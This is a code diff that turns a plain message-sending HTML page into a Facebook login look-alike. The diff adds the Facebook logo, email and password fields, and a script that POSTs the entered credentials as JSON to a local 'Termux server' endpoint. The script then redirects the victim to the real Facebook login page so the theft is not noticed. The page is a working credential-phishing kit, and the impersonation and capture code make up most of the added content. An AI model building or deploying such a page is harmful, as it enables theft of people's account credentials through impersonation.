@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Send Message</title>
+<title>Facebook Login</title>
 <style>
-/* Reset some default styles */
+/* Reset defaults */
 body, html {
   margin: 0;
   padding: 0;
   height: 100%;
   font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
-  background-color: #f0f2f5; /* Facebook-like background */
+  background-color: #f0f2f5;
 }
 
-/* Center container like Facebook login box */
+/* Center the login box */
 .container {
   width: 100%;
   height: 100%;
@@ -21,17 +21,18 @@ body, html {
   align-items: center;
 }
 
+/* Facebook-style login box */
 .login-box {
   background-color: white;
-  padding: 40px;
+  padding: 40px 40px 20px 40px;
   border-radius: 8px;
   box-shadow: 0 2px 10px rgba(0,0,0,0.2);
   width: 360px;
   text-align: center;
 }
 
-.login-box h2 {
-  color: #1877f2; /* Facebook blue */
+.login-box img.logo {
+  width: 180px;
   margin-bottom: 20px;
 }
 
@@ -55,16 +56,32 @@ body, html {
   border-radius: 6px;
   font-size: 16px;
   cursor: pointer;
+  font-weight: bold;
 }
 
 .login-box button:hover {
   background-color: #165ec9;
 }
 
-.login-box small {
+.login-box a {
   display: block;
+  margin-top: 12px;
+  font-size: 14px;
+  color: #1877f2;
+  text-decoration: none;
+}
+
+.login-box a:hover {
+  text-decoration: underline;
+}
+
+.notice {
   margin-top: 15px;
-  color: #606770;
+  font-size: 12px;
+  color: #333;
+  background-color: #f0f2f5;
+  padding: 10px;
+  border-radius: 6px;
 }
 </style>
 </head>
@@ -73,24 +90,45 @@ body, html {
 
 <div class="container">
   <div class="login-box">
-    <h2>Facebook</h2>
-    <input id="msg" placeholder="Type your message here">
-    <button onclick="send()">Send</button>
-    <small>This message will appear in Termux</small>
+    <!-- Facebook logo -->
+    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook">
+    
+    <!-- Email and Password fields -->
+    <input id="email" type="email" placeholder="Email address">
+    <input id="password" type="password" placeholder="Password">
+    
+    <button onclick="send()">Log In</button>
+    
+    <!-- Additional links like Facebook -->
+    <a href="#">Forgotten password?</a>
+    
+    <!-- Termux notice -->
+    <div class="notice">
+      ⚠️ Notice: This page sends login information directly to Termux.
+    </div>
   </div>
 </div>
 
 <script>
 async function send() {
-  const message = document.getElementById("msg").value
+  const email = document.getElementById("email").value;
+  const password = document.getElementById("password").value;
+
+  // Send data to your Termux server
   await fetch("/send", {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
     },
-    body: JSON.stringify({ message })
-  })
-  document.getElementById("msg").value = ""
+    body: JSON.stringify({ email, password })
+  });
+
+  // Optional: clear inputs
+  document.getElementById("email").value = "";
+  document.getElementById("password").value = "";
+
+  // Redirect user to the real Facebook login page
+  window.location.href = "https://www.facebook.com/login.php";
 }
 </script>
 
